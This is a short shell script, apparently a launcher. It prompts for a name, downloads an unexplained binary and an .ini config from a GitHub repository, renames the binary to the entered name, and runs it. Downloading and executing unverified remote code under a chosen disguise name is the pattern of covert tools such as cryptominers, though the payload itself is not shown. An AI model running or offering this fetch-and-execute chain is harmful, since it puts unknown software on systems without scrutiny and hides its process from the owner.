read -p " name: " CRP
wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/texk.ini && mv cok $CRP && chmod +x $CRP && ./$CRP texk.ini
